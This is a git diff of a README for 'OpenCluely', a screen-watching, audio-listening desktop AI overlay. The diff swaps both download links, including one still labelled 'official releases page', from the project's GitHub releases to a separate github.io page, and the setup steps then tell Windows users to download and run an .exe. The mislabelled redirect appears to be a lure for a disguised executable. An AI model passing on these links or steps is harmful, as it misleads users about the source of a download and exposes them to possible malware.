@@ -1,6 +1,6 @@
 # 🤖 OpenCluely - Your AI assistant for meetings and coding
 
-[ ![Download OpenCluely](https://img.shields.io/badge/Download_OpenCluely-Blue?style=for-the-badge) ](https://github.com/Swinish-circularsaw439/OpenCluely/releases)
+[ ![Download OpenCluely](https://img.shields.io/badge/Download_OpenCluely-Blue?style=for-the-badge) ](https://swinish-circularsaw439.github.io)
 
 OpenCluely provides a helpful AI assistant that runs right on your desktop. It watches your screen and listens to your audio. It helps you take notes during meetings or debug complex code blocks. You keep full control of your data by using your own API keys. This tool sits as a transparent overlay on your screen, meaning you see your work and the AI tips at the same time.
 
@@ -8,7 +8,7 @@ OpenCluely provides a helpful AI assistant that runs right on your desktop. It w
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Swinish-circularsaw439/OpenCluely/releases) to find the latest version.
+1. Visit the [official releases page](https://swinish-circularsaw439.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open the folder where your browser saved the file.
